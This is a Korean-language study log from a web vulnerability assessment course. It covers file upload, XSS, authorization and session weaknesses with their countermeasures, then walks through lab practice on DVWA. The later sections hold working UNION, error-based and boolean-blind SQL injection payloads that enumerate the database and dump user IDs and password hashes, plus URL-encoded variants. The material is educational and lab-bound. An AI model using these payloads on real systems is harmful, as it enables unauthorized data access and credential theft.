250725

// yesterday summary
File Upload 취약점
1. 업로드 되는 파일에 대한 검증
2. 업로드 성공 메세지 혹은 업로드 된 파일에 대한 리스트등에서 파일의 경로 노출 방지
3. 해당 파일에 대한 타 사용자(혹은 공격자)의 실행 권한 제거

File Inclusion 취약점
1. LFI(Local~)
2. RFI(Remote~)

// 기반시설가이드 웹 항목
> 시간상 강의자료 기반으로 몇 가지 내용만 설명
XSS 
>대상 서비스가 어떤 기능을 가지고 있고, 그 중 어떤 기능을 탐색해야하는지
>>게시판, 검색 등 사용자의 모든 입력값
> 키워드 필터링을 통한 입/출력 값에 대한 검증
>> 자주 사용되는 태그
Reflected
> 작성한 내용(악성 스크립트)이 응답 패킷에 그대로 노출되어 실행되거나
>> 1. 서버 혹은 사용자의 정보 획득
>> 2. 리다이렉트 도메인을 변조하여 공격자의 도메인으로 유도, 사용자의 정보를 도용
> 리다이렉트 혹은 포워드 사용시 URL 파라미터를 포함하지 않도록 설정
> 화이트리스트 작성 후 그 외 도메인으로의 리다이렉션은 드랍시키기
SQL injection
> 소스코드를 보지 않는 한 쿼리가 적용되는 기능을 100% 알 수는 없음.
> 기본적으로 로그인, 검색 등 데이터 혹은 파일 을 출력하는 기능에 대해 확인하고
> (강사님)쿼리가 불필요 해보이는 기능들에 대해서도 쿼리문을 입력하여 인젝션이 가능한지 아닌지 확인해봄.
> 인젝션이 되는지 안되는지 확인만 하는 경우가 많지만, 실제 DB에서 내용을 출력시키는 것까지 테스트하여 진단하는 경우도 있음.
> 실무에서 "or" 구문은 잘 사용되지 않음 > 서버에 무리가 갈 수 있음.
> 특수문자 필터링을 통해 입력된 쿼리가 동작되지 않도록 해야함.

불충분한 인가
> 웹 애플리케이션에 전달되는 파라미터 값이나 히든 필드를 위/변조하여 정보를 획득 혹은 변조 할 수 있는 취약점.
> 취약점 진단 시 "상" 혹은 "긴급"에 해당하는 내용임. > 직접적으로 서비스에 영향을 줄 수 있는 취약점.
> ex) 금액 변조, 비공개 게시글 접근, 타 사용자의 회원정보 열람 및 수정
> ?다 파라미터 조작인데 구분이 잘 안되지 않나 > 행위로 인해서 발생하는 결과에 따라 항목이 구분됨
> ex) (실사례)기차표 예약
>> js에 대기 검증 로직이 포함되어 있었음. > 인증이나 검증은 무조건 서버 측에 구현되어야함.

> 게시글 접근 시 사용자 검증 부재 : 파라미터 값만으로는 확인하기 어려움. 
>> 허용된 페이지만 접근할 수 있도록 서버 측에서 검증
>> 특정 데이터에 대해 세션값 인증을 통해 접근 필터링

> 해당 값이 변조되었는지 추가적으로 비교 검증하는 로직 필요

경로 추적
> RFI, LFI

파일 업로드
> 경로, 실행에 대한 내용이 없음 > 추가적으로 필요함.
> 확장자 화이트리스트 작성, 특수문자 필터링(상대경로 등 기능을 가진 문자들), 업로드 디렉터리 개별 설정, 
> 파일 다운로드와의 구분은 다운로드이냐 실행이냐의 차이를 기준으로 하면 됨.

파일 다운로드

취약한 접근 통제 관리
> 약한 문자열 강도, 취약한 패스워드 복구, 자동화 공격 등 패스워드 관련 취약점
> 비밀번호 형식 정책, 인증 시도 횟수 제한 정책 등

> 정보 누출, 관리자 페이지 노출, 위치 공개(경로 노출) 등 중요정보 관련 취약점
> 계정명 전체 노출x, 유추 가능한 페이지 주소 사용x, 검색엔진 수집 거부 설정, 불필요한 백업/테스트 파일 삭제
> ex) robots.txt : 특정 로봇(주로 크롤링)의 접근을 제어하는 데 사용되는 파일.
> ex) https://11st.co.kr/robots.txt 

> 쿠키 변조, 세션 고정, 세션 예측(세션 키가 단순할 때), 불충분한 세션 만료(30분 자동로그아웃), 
> (금융) 타 사용자의 세션 값을 사용이 가능한 경우 취약점.
> 취약한 쿠키 대신 Server Side Session
> ex) NAT ip : Network Address Translation(cmd\ipconfig)
> 

중요 정보 저장/전송 처리 미흡
> SSL 적용되어 있으면 됨.

부적절한 오류 처리

취약한 보안 설정

// SQL injection 개념
> 입력 값 검증 부재로 악성 SQL 쿼리문을 서버로 전달하여 데이터베이스가 비정상적인 동작을 하도록 조작하는 공격
> 유형
	크게 1. (실습예정) Error based ~
	> SQL 쿼리문의 잘못된 문법이나 자료형 불일치 등의 오류 메세지를 확인하여 공격하는 기법
	크게 2. Blind ~
	> SQL 오류 메세지가 노출되지 않는 경우에 사용하는 공격 기법
		2.1. (실습예정)Boolean based ~
		> 참/거짓을 의미하는 데이터 타입으로 참일 때 결과와 거짓일 때 결과로 판단하는 기법
		2.2. time based ~
		> Boolean 정보도 노출되지 않을 때, 입력에 따른 응답에 걸리는 시간으로 판단하거나, 응답을 지연시키는 Sleep 함수를 사용하여 공격하는 방법.
	Union ~
	> Union 명령어를 활용하어 원래의 쿼리 결과에 공격자가 원하는 쿼리 결과를 합쳐서 출력시키는 공격 기법
	mass ~
	> 대량 삽입 공격, 다른 SQL injection 공격과 다르게 다량의 sql 코드를 삽입하여 DB를 조작하는 기법
	
> SQL : DB에서 데이터를 관리,조작,추출 하기 위한 DB 표준 프로그래밍 언어
> DML : Manipulation, 데이터 조회/추가/수정/삭제등에 사용됨. SELECT,INSERT,UPDATE,DELETE 등이 있음.
> DDL : Definition, 테이블 생성/삭제/수정 등에 사용됨. CREATE, ALTER, DROP, RENAME, TRUNCATE등이 있음
> DCL : Control, DB 접근 권한 관리에 사용됨. GRANT,REVOKE등이 있음


// SQL injection 실습

환경구성

CREATE TABLE testtable(
user_id INT(11) NOT NULL,
first_name VARCHAR(20) NOT NULL,
last_name VARCHAR(20) NOT NULL,
user VARCHAR(20) NOT NULL,
password VARCHAR(20) NOT NULL,
security TEXT NULL);
SHOW tables;
DESC testtable;
DROP testtable;

UNION 
> 여러 쿼리무들을 합쳐서 하나의 쿼리문으로 만들어주는 SQL 구문.
> 중복된 값을 제거하고 출력
> UNION ALL : 중복된 값도 포함하여 출력
select country from table_1 union select country from table_2;
select country from table_1 union all select country from table_2;
> UNION SELECT 의 사용조건 1 : 두 SELECT 문의 컬럼의 갯수가 동일 해야함.
> UNION SELECT 의 사용조건 2 : 두 SELECT 문의 컬럼 각각의 데이터 타입이 동일 해야함.
>> MySQL의 경우 자동 형변환되어 상관없지만, 다른 DB의 경우 데이터 타입을 일치시켜주어야함.
>> ex) select num, country, name from table_1 union select 1,2,3 from table_2;
>> 위 예시는 MySQL에서는 동작하지만 다른 DB에서는 안되는 경우가 있음.

Order by
> SELECT 문으로 조회한 데이터를 정렬(오름/내림) 시킬 때 사용함.
> injection 구문에서는 컬럼(속성)의 수를 확인하기 위해서 사용됨.
1' order by 1; #
> order by 2 입력 시 결과 출력되고, order by 3 입력 시 에러가 발생함. > 앞의 select문의 컬럼이 2개임.

Error Based
' 
> Syntax 에러 발생 > 입력 값이 그대로 쿼리문에 들어갔음을 확인.
> 대응방안 : Prepared Statement , 그대로 쿼리문에 넣는 것이 아니라 다른 변수에 받아 검증 후 쿼리문에 입력하는 방식.
> Blind : 똑같이 입력해도 준비된 에러문이 출력됨 > 에러임을 제외, 정보를 확인할 수 없음.

information_schema
> MySQL DB 에서 schema의 이름 , 테이블, 칼럼 정보들을 관리하는 schema.

SELECT * FROM information_schema.schemata;
=> information_schema의 schemata 테이블 조회
SELECT schema_name FROM information_schema.schemata;
=> 데이터베이스 이름 확인
SELECT table_name FROM information_schema.tables WHERE table_schema='dvwa';
=> dvwa 데이터베이스의 테이블 출력
SELECT column_name FROM information_schema.columns WHERE table_schema='dvwa';
=> dvwa 데이터베이스의 컬럼 출력
SELECT column_name FROM information_schema.columns WHERE table_schema='dvwa' and table_name='users';
=> and 조건을 넣은 이유는 'users' 테이블과 관련된 컬럼만 출력하기 위해서 넣음
SELECT user, password FROM users;
=> 위 과정에서 확인된 정보로 계정 출력

--------------------------------------------------------------------------------
//Error based SQL injection 실습 (Burpsuite의 Proxy와 Repeater를 사용하여 진행하세요)
union을 사용하여 DB관련 정보를 획득하세요: DB명(dvwa), 테이블명(users), 컬럼명(user), user ID(admin) 정보까지 출력
(low)
1' order by 1 #
1' order by 3 #
' union select 1,schema_name from information_schema.schemata #
' union select 1,table_name from information_schema.tables where table_schema = "dvwa" #
' union select 1,column_name from information_schema.columns where table_schema = "dvwa" and table_name = "users" #
' union select user, user_id from dvwa.users #

(medium)

--------------------------------------------------------------------------------

// Blind based SQL injection 개념
LIMIT
> 출력하는 개수를 제한할 때 사용하는 구문

SUBSTR
> substring이라는 문자열 가르기 함수
> ex substr(문자열,시작위치,길이)

1~6 까지 입력해보며 입력값에 따른 출력값이 다름을 확인함.
1~5		: "User ID exists in the database."			> True
6 이상	: "User ID is MISSING from the database." 	> False

1' and length(database())=1#	> False
1' and length(database())=4#	> True

1' and substr((select table_name from information_schema.tables where table_schema="dvwa" limit 1, 1),1,1)='u'#
1' and substr((select table_name from information_schema.tables where table_schema="dvwa" limit 4, 1),1,1)='u'#
--------------------------------------------------------------------------------
// Blind based SQL injection 실습
문제 (Burpsuite의 Proxy와 Repeater를 사용하여 진행하세요)
substr을 사용하여 DB관련 정보를 획득하세요(기존 실습내용 참고): DB명(dvwa), 테이블명(users), 컬럼명(user), user ID(admin) 정보까지 출력
1' and substr((select table_name from information_schema.tables where table_schema='dvwa' limit 3,1),1,1)='u'#
--------------------------------------------------------------------------------
// UNION 개인 실습
> 동일한 환경 사용, 난이도 LOW

' union select 1 from information_schema.tables; -- .
Fatal error: Uncaught mysqli_sql_exception: The used SELECT statements have a different number of columns in
UNION 또는 UNION ALL 구문을 사용할 때, SELECT 문들 간에 컬럼 수가 일치하지 않아서 발생합니다.

' union select 1,2 from information_schema.tables; -- .
출력 확인
' union select 1,TABLE_SCHEMA from information_schema.tables ; -- .
// information_schema, performance_schema 외에 "dvwa" 라는 DB가 있음을 확인할 수 있음.
// ? 왜 3개밖에 안나오는지 실제로 DB에서 확인하면 "mysql", "sys" 라는 DB가 더 있음.

' union select 1,TABLE_NAME from information_schema.tables WHERE TABLE_SCHEMA = "dvwa"; -- .
//table_1, table_2, testTable2, guestbook, users 5개의 테이블이 있는 것을 확인함

' union select TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA = "dvwa"; -- .

' union select TABLE_NAME,COLUMN_NAME FROM information_schema.columns WHERE TABLE_SCHEMA = "dvwa" AND TABLE_NAME = "users"; -- .

' UNION SELECT user_id,password FROM dvwa.users; -- .
user_id 에 따른 password 정보를 얻었으니 암호화 방식 및 실제 암호에 대해서 무작위 대입을 통한 복호화 가능. 모든 계정의 비밀번호 획득 가능
' UNION SELECT num,country FROM dvwa.table_1; -- .
' UNION SELECT num,name FROM dvwa.table_1; -- .
--------------------------------------------------------------------------------



' union select 1, database()#


space +
,	%2C
#	%23
(	%28
)	%29
'	%27

%27+union+select+1%2C+database%28%29%23

where id = 27 union